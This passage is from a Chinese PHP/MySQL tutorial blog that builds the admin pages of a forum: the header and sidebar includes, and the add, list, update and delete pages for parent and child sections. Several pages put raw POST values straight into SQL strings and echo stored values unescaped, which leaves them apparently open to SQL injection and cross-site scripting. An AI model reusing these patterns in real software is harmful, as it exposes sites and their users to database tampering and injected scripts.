id="一、前台与后台的界面"><a href="#一、前台与后台的界面" class="headerlink" title="一、前台与后台的界面"></a>一、前台与后台的界面</h4><p>前台和后台界面可以自己用html和css写，也可以找一些模板。我为了方便，于是找了模板。。。。毕竟是主要为了练习php和sql语句以及mysql函数。</p><p><strong>前台界面模板</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716170411265.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>后台界面模板</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716170422191.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>后台界面有点不合适，于是把顶部、底部和左侧写在不同文件，把后台界面修改了一下</p><p>header.inc.php、sidebar.inc.php和footer.inc.php(都在admin目录里的inc目录里)</p><pre><code class="php">//header.inc.php&lt;?php$query=&quot;select * from info where id=1&quot;;$result_info=execute($link, $query);$data_info=mysqli_fetch_assoc($result_info);?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;&lt;?php echo $template[&#39;title&#39;] ?&gt; - &lt;?php echo $data_info[&#39;title&#39;]?&gt;&lt;/title&gt;    &lt;meta name=&quot;keywords&quot; content=&quot;&lt;?php echo $data_info[&#39;keywords&#39;]?&gt;&quot; /&gt;    &lt;meta name=&quot;description&quot; content=&quot;&lt;?php echo $data_info[&#39;description&#39;]?&gt;&quot; /&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/common.css&quot;/&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/main.css&quot;/&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;topbar-wrap white&quot;&gt;    &lt;div class=&quot;topbar-inner clearfix&quot;&gt;        &lt;div class=&quot;topbar-logo-wrap clearfix&quot;&gt;            &lt;h1 class=&quot;topbar-logo none&quot;&gt;&lt;a href=&quot;index.html&quot; class=&quot;navbar-brand&quot;&gt;后台管理&lt;/a&gt;&lt;/h1&gt;            &lt;ul class=&quot;navbar-list clearfix&quot;&gt;                &lt;li&gt;&lt;a class=&quot;on&quot; href=&quot;login.html&quot;&gt;后台首页&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href=&quot;../index.php&quot; target=&quot;_blank&quot;&gt;网站首页&lt;/a&gt;&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class=&quot;top-info-wrap&quot;&gt;            &lt;ul class=&quot;top-info-list clearfix&quot;&gt;                &lt;li&gt;管理员&lt;?php echo $_SESSION[&#39;manage&#39;][&#39;username&#39;]?&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href=&quot;logout.php&quot;&gt;注销&lt;/a&gt;&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;</code></pre><pre><code class="php">//sidebar.inc.php&lt;div class=&quot;container clearfix&quot;&gt;    &lt;div class=&quot;sidebar-wrap&quot;&gt;        &lt;div class=&quot;sidebar-title&quot;&gt;            &lt;h1&gt;菜单&lt;/h1&gt;        &lt;/div&gt;        &lt;div class=&quot;sidebar-content&quot;&gt;            &lt;ul class=&quot;sidebar-list&quot;&gt;                &lt;li&gt;                    &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe018;&lt;/i&gt;系统&lt;/a&gt;                    &lt;ul class=&quot;sub-menu&quot;&gt;                        &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe017;&lt;/i&gt;系统信息&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href=&quot;manage.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe014;&lt;/i&gt;管理员&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href=&quot;manage_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe068;&lt;/i&gt;添加管理员&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href=&quot;system.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe002;&lt;/i&gt;站点设置&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe009;&lt;/i&gt;内容管理&lt;/a&gt;                    &lt;ul class=&quot;sub-menu&quot;&gt;                        &lt;li&gt;&lt;a href=&quot;father_module.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe006;&lt;/i&gt;父版块列表&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href=&quot;father_module_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe005;&lt;/i&gt;添加父版块&lt;/a&gt;&lt;/li&gt;                        &lt;?php                        if(basename($_SERVER[&#39;SCRIPT_NAME&#39;])==&#39;father_module_update.php&#39;){                            echo &#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe002;&lt;/i&gt;编辑父板块&lt;/a&gt;&lt;/li&gt;&#39;;                        }                        ?&gt;                        &lt;li&gt;&lt;a href=&quot;son_module.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe006;&lt;/i&gt;子版块列表&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href=&quot;son_module_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe005;&lt;/i&gt;添加子版块&lt;/a&gt;&lt;/li&gt;                        &lt;?php                        if(basename($_SERVER[&#39;SCRIPT_NAME&#39;])==&#39;son_module_update.php&#39;){                            echo &#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe002;&lt;/i&gt;编辑子板块&lt;/a&gt;&lt;/li&gt;&#39;;                        }                        ?&gt;                        &lt;li&gt;&lt;a href=&quot;../index.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe012;&lt;/i&gt;帖子管理&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe003;&lt;/i&gt;用户管理&lt;/a&gt;                    &lt;ul class=&quot;sub-menu&quot;&gt;                        &lt;li&gt;&lt;a href=&quot;member_list.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe041;&lt;/i&gt;用户列表&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;</code></pre><pre><code class="php">//footer.inc.php&lt;/body&gt;&lt;/html&gt;</code></pre><p><em>效果</em></p><p><img src="http://img-blog.csdnimg.cn/20190716170437400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="二、后台-父版块"><a href="#二、后台-父版块" class="headerlink" title="二、后台-父版块"></a>二、后台-父版块</h4><p><strong>父版块列表页</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716170450310.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>要实现上述效果。</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先，引入文件config.inc.php、mysql.inc.php、tool.inc.php、header.inc.php、sidebar.inc.php。</p><p>其次，连接数据库、管理员是否登录验证、写出页面标题(在页面顶部文件输出)、执行sql增删改查对father_module数据表信息进行相关操作，在修改、添加版块，引入文件进行输入内容的相关验证(check_father_module.inc.php)。</p><p>最后，在以关联数组的方式获取一条记录的数据。在定界符区域内输出id、排序和父版块的名字，以及删除和修改超链接。点击删除，跳转到father_module_delete.php，通过获取的id删除指定版块。</p><p>点击修改，跳转到father_module_update.php通过sql语句的增删改查，进行修改。</p><p><u>父版块代码如下：</u></p><p><strong>1.father_module.php</strong></p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;$template[&#39;title&#39;]=&#39;父板块列表页&#39;;$query=&quot;select*from father_module&quot;;$result=execute($link,$query);?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;&lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;index.php&quot;&gt;后台首页&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;父版块列表&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class=&quot;result-wrap&quot;&gt;            &lt;form name=&quot;myform&quot; id=&quot;myform&quot; method=&quot;post&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;                    &lt;div class=&quot;result-list&quot;&gt;                        &lt;a href=&quot;father_module_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;新增板块&lt;/a&gt;                    &lt;/div&gt;                &lt;/div&gt;                &lt;div class=&quot;result-content&quot;&gt;                    &lt;table class=&quot;result-tab&quot; width=&quot;100%&quot;&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;5%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;th&gt;排序&lt;/th&gt;                            &lt;th&gt;ID&lt;/th&gt;                            &lt;th&gt;版块名称&lt;/th&gt;                            &lt;th&gt;操作&lt;/th&gt;                        &lt;/tr&gt;                        &lt;?php                        while($data=mysqli_fetch_assoc($result)){                            $url=urlencode(&quot;father_module_delete.php?id={$data[&#39;Id&#39;]}&quot;);                            $return_url=urlencode($_SERVER[&#39;REQUEST_URI&#39;]);                            $message=&quot;你真的要删除父版块 {$data[&#39;module_name&#39;]} 吗？&quot;;                            $delete_url=&quot;confirm.php?url={$url}&amp;return_url={$return_url}&amp;message={$message}&quot;;$html=&lt;&lt;&lt;A                            &lt;tr&gt;                                &lt;td class=&quot;tc&quot;&gt;&lt;input name=&quot;id[]&quot; value=&quot;59&quot; type=&quot;checkbox&quot;&gt;&lt;/td&gt;                                &lt;td&gt;                                    &lt;input class=&quot;common-input sort-input&quot; name=&quot;ord[]&quot; value=&quot;{$data[&#39;sort&#39;]}&quot; type=&quot;text&quot;&gt;                                &lt;/td&gt;                                &lt;td&gt;{$data[&#39;Id&#39;]}&lt;/td&gt;                                &lt;td&gt;{$data[&#39;module_name&#39;]}&lt;/td&gt;                                &lt;td&gt;                                    &lt;a class=&quot;link-update&quot; href=&quot;father_module_update.php?Id={$data[&#39;Id&#39;]}&quot;&gt;[修改]&lt;/a&gt;                                    &lt;a class=&quot;link-del&quot; href=&quot;$delete_url&quot;&gt;[删除]&lt;/a&gt;                                &lt;/td&gt;                            &lt;/tr&gt;A;                            echo $html;                        }                        ?&gt;                    &lt;/table&gt;                    &lt;!--&lt;div class=&quot;list-page&quot;&gt; 2 条 1/1 页&lt;/div&gt;--&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;?phpinclude_once &#39;inc/footer.inc.php&#39;;//footer?&gt;</code></pre><p><strong>2.father_module_delete.php</strong></p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;if(!isset($_GET[&#39;id&#39;]) || !is_numeric($_GET[&#39;id&#39;])){    echo&quot;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;id参数错误!&#39;);location=&#39;father_module.php&#39;;&lt;/script&gt;&quot;;    exit();}$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;$query=&quot;delete from father_module where id={$_GET[&#39;id&#39;]}&quot;;execute($link,$query);if(mysqli_affected_rows($link)==1){    skip(&#39;father_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你删除成功！&#39;);}else{    skip(&#39;father_module.php&#39;,&#39;onError.gif&#39;,&#39;对不起删除失败，请重试！&#39;);}?&gt;</code></pre><p><strong>3.father_module_update.php</strong></p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;if(!isset($_GET[&#39;Id&#39;])||!is_numeric($_GET[&#39;Id&#39;])){    skip(&#39;father_module.php&#39;,&#39;onError.gif&#39;,&#39;id参数错误！&#39;);}$query=&quot;select*from father_module where Id={$_GET[&#39;Id&#39;]}&quot;;$result=execute($link,$query);if(!mysqli_num_rows($result)){    skip(&#39;father_module.php&#39;,&#39;onShow.gif&#39;,&#39;这个版块信息不存在！&#39;);}if(isset($_POST[&#39;submit&#39;])){    //验证用户填写的信息    $check_flag=&#39;update&#39;;    include &#39;inc/check_father_module.inc.php&#39;;    $query=&quot;update father_module set module_name=&#39;{$_POST[&#39;module_name&#39;]}&#39;,sort={$_POST[&#39;sort&#39;]} where Id={$_GET[&#39;Id&#39;]}&quot;;    execute($link,$query);    if(mysqli_affected_rows($link)==1){        skip(&#39;father_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;修改成功！&#39;);    }else{        skip(&#39;father_module.php&#39;,&#39;onError.gif&#39;,&#39;修改失败,请重试！&#39;);    }}$data=mysqli_fetch_assoc($result);$template[&#39;title&#39;]=&#39;父板块修改页&#39;;?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;  &lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;father_module.php&quot;&gt;父版块列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;修改父版块-&lt;?php echo $data[&#39;module_name&#39;]?&gt;&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;form method=&quot;post&quot;&gt;        &lt;div class=&quot;result-content&quot;&gt;                    &lt;table class=&quot;result-tab&quot; width=&quot;70%&quot;&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;版块名称&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;module_name&quot; class=&quot;common-text&quot; value=&quot;&lt;?php echo $data[&#39;module_name&#39;]?&gt;&quot;/&gt;&lt;/td&gt;                            &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;排序&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sort&quot; class=&quot;common-text&quot; value=&quot;&lt;?php echo $data[&#39;sort&#39;]?&gt;&quot;/&gt;&lt;/td&gt;                            &lt;td&gt;填入一个数字即可&lt;/td&gt;                        &lt;/tr&gt;                    &lt;/table&gt;                    &lt;br /&gt;                    &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;修改&quot; /&gt;        &lt;/div&gt;        &lt;/form&gt;  &lt;/div&gt;&lt;/div&gt;&lt;?phpinclude_once &#39;inc/footer.inc.php&#39;;//footer?&gt;</code></pre><p><strong>在对父版块的操作中，只有删除和修改是不够的。还应该有父版块添加页father_module_add.php。</strong></p><p><strong>4.father_module_add.php</strong></p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;if(isset($_POST[&#39;submit&#39;])){    $link=connect();    //验证用户填写的信息    $check_flag=&#39;add&#39;;    include &#39;inc/check_father_module.inc.php&#39;;    $query=&quot;insert into father_module(module_name,sort) values(&#39;{$_POST[&#39;module_name&#39;]}&#39;,{$_POST[&#39;sort&#39;]})&quot;;    execute($link,$query);    if(mysqli_affected_rows($link)==1){        skip(&#39;father_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你，添加成功！&#39;);    }else{        skip(&#39;faher_module_add.php&#39;,&#39;onError.gif&#39;,&#39;对不起，添加失败，请重试！&#39;);    }}$template[&#39;title&#39;]=&#39;父版块添加页&#39;;?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;  &lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;father_module.php&quot;&gt;父板块列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;添加父版块&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;form method=&quot;post&quot;&gt;        &lt;div class=&quot;result-content&quot;&gt;                    &lt;table class=&quot;result-tab&quot; width=&quot;70%&quot;&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;版块名称&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;module_name&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt;                            &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;排序&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sort&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt;                            &lt;td&gt;填入一个数字即可&lt;/td&gt;                        &lt;/tr&gt;                    &lt;/table&gt;                    &lt;br /&gt;                    &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加&quot; /&gt;        &lt;/div&gt;        &lt;/form&gt;  &lt;/div&gt;&lt;/div&gt;&lt;?phpinclude_once &#39;inc/footer.inc.php&#39;;//footer?&gt;</code></pre><p>父版块添加页效果如下：</p><p><img src="http://img-blog.csdnimg.cn/20190716170513368.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="三、后台-子版块"><a href="#三、后台-子版块" class="headerlink" title="三、后台-子版块"></a>三、后台-子版块</h4><p><strong>子版块列表页</strong><br><img src="http://img-blog.csdnimg.cn/20190716170525386.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>实现上述效果。除了sql语句操作的数据表(son_module)和输入内容验证文件(check_son_module.inc.php)不同外，其他和父版块类似，可以参考一下父版块的。</p><p>代码如下：</p><p><strong>1.son_module.php</strong></p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;$template[&#39;title&#39;]=&#39;子板块列表页&#39;;$query=&quot;select sm.id,sm.module_name,fm.module_name father_module_name,sm.member_id,sm.sort from son_module sm,father_module fm where sm.father_module_id=fm.id order by fm.id&quot;;$result=execute($link,$query);?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;&lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;index.php&quot;&gt;后台首页&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;子版块列表&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class=&quot;result-wrap&quot;&gt;            &lt;form name=&quot;myform&quot; id=&quot;myform&quot; method=&quot;post&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;                    &lt;div class=&quot;result-list&quot;&gt;                        &lt;a href=&quot;son_module_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;新增板块&lt;/a&gt;                    &lt;/div&gt;                &lt;/div&gt;                &lt;div class=&quot;result-content&quot;&gt;                    &lt;table class=&quot;result-tab&quot; width=&quot;100%&quot;&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;5%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;th&gt;排序&lt;/th&gt;                            &lt;th&gt;ID&lt;/th&gt;                            &lt;th&gt;版块名称&lt;/th&gt;                            &lt;th&gt;所属父版块&lt;/th&gt;                            &lt;th&gt;版主&lt;/th&gt;                            &lt;th&gt;操作&lt;/th&gt;                        &lt;/tr&gt;                        &lt;?php                        while($data=mysqli_fetch_assoc($result)){                            $url=urlencode(&quot;son_module_delete.php?id={$data[&#39;id&#39;]}&quot;);                            $return_url=urlencode($_SERVER[&#39;REQUEST_URI&#39;]);                            $message=&quot;你真的要删除父版块 {$data[&#39;module_name&#39;]} 吗？&quot;;                            $delete_url=&quot;confirm.php?url={$url}&amp;return_url={$return_url}&amp;message={$message}&quot;;$html=&lt;&lt;&lt;A                            &lt;tr&gt;                                &lt;td class=&quot;tc&quot;&gt;&lt;input name=&quot;id[]&quot; value=&quot;59&quot; type=&quot;checkbox&quot;&gt;&lt;/td&gt;                                &lt;td&gt;                                    &lt;input class=&quot;common-input sort-input&quot; name=&quot;ord[]&quot; value=&quot;{$data[&#39;sort&#39;]}&quot; type=&quot;text&quot;&gt;                                &lt;/td&gt;                                &lt;td&gt;{$data[&#39;id&#39;]}&lt;/td&gt;                                &lt;td&gt;{$data[&#39;module_name&#39;]}&lt;/td&gt;                                &lt;td&gt;{$data[&#39;father_module_name&#39;]}&lt;/td&gt;                                &lt;td&gt;{$data[&#39;member_id&#39;]}&lt;/td&gt;                                &lt;td&gt;                                    &lt;a class=&quot;link-update&quot; href=&quot;#&quot;&gt;[访问]&lt;/a&gt;                                    &lt;a class=&quot;link-update&quot; href=&quot;son_module_update.php?id={$data[&#39;id&#39;]}&quot;&gt;[修改]&lt;/a&gt;                                    &lt;a class=&quot;link-del&quot; href=&quot;$delete_url&quot;&gt;[删除]&lt;/a&gt;                                &lt;/td&gt;                            &lt;/tr&gt;A;                            echo $html;                        }                        ?&gt;                    &lt;/table&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;?phpinclude_once &#39;inc/footer.inc.php&#39;;//footer?&gt;</code></pre><p><strong>2.son_module_delete.php</strong></p><pre><code class="php">&lt;?php include_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;if(!isset($_GET[&#39;id&#39;]) || !is_numeric($_GET[&#39;id&#39;])){    skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;id参数错误！&#39;);}$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;$query=&quot;delete from son_module where id={$_GET[&#39;id&#39;]}&quot;;execute($link,$query);if(mysqli_affected_rows($link)==1){    skip(&#39;son_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你删除成功！&#39;);}else{    skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;对不起删除失败，请重试！&#39;);}?&gt;</code></pre><p><strong>3.son_module_update.php</strong></p><pre><code class="php">&lt;?php include_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$template[&#39;title&#39;]=&#39;子版块修改页&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;if(!isset($_GET[&#39;id&#39;]) || !is_numeric($_GET[&#39;id&#39;])){    skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;id参数错误！&#39;);}$query=&quot;select * from son_module where id={$_GET[&#39;id&#39;]}&quot;;$result=execute($link,$query);if(!mysqli_num_rows($result)){    skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;这条子版块信息不存在！&#39;);}$data=mysqli_fetch_assoc($result);if(isset($_POST[&#39;submit&#39;])){    //验证    $check_flag=&#39;update&#39;;    include &#39;inc/check_son_module.inc.php&#39;;    $query=&quot;update son_module set father_module_id={$_POST[&#39;father_module_id&#39;]},module_name=&#39;{$_POST[&#39;module_name&#39;]}&#39;,info=&#39;{$_POST[&#39;info&#39;]}&#39;,member_id={$_POST[&#39;member_id&#39;]},sort={$_POST[&#39;sort&#39;]} where id={$_GET[&#39;id&#39;]}&quot;;    execute($link,$query);    if(mysqli_affected_rows($link)==1){        skip(&#39;son_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;修改成功！&#39;);    }else{        skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;修改失败,请重试！&#39;);    }}?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;&lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;father_module.php&quot;&gt;父板块列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;添加子版块&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;form method=&quot;post&quot;&gt;        &lt;div class=&quot;result-content&quot;&gt;                    &lt;table class=&quot;result-tab&quot; width=&quot;80%&quot;&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;所属父版块&lt;/td&gt;                            &lt;td&gt;                                &lt;select name=&quot;father_module_id&quot;&gt;                                    &lt;option value=&quot;0&quot;&gt;===请选择一个父版块===&lt;/option&gt;                                    &lt;?php                                    $query=&quot;select*from father_module&quot;;                                    $result_father=execute($link,$query);                                    while ($data_father=mysqli_fetch_assoc($result_father)){                                        if($data[&#39;father_module_id&#39;]==$data_father[&#39;Id&#39;]){                                            echo &quot;&lt;option value=&#39;{$data_father[&#39;Id&#39;]}&#39; selected=&#39;selected&#39;&gt;{$data_father[&#39;module_name&#39;]}&lt;/option&gt;&quot;;                                        }else{                                            echo &quot;&lt;option value=&#39;{$data_father[&#39;Id&#39;]}&#39;&gt;{$data_father[&#39;module_name&#39;]}&lt;/option&gt;&quot;;                                        }                                    }                                    ?&gt;                                &lt;/select&gt;                            &lt;/td&gt;                            &lt;td&gt;*请选择一个父版块&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;版块名称&lt;/td&gt;                            &lt;td&gt;&lt;input 